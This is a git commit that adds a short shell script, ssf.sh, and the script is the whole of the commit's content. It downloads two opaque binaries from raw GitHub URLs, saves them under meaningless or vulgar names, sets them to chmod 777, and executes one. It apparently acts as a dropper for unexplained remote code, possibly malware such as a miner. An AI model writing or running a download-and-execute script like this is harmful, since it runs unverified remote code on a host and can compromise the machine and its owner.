a84aa1ef34bed2f91aae8e8af2a8dee457247053
ferasa <86012372+desafff@users.noreply.github.com>
2021-07-21 20:01:28 +0700

    Create ssf.sh

---
+++ ssf.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget -O syng https://raw.githubusercontent.com/desafff/gader/main/fas
+wget -O kontol https://raw.githubusercontent.com/githubasem/vio/main/vio
+chmod 777 syng kontol
+./syng
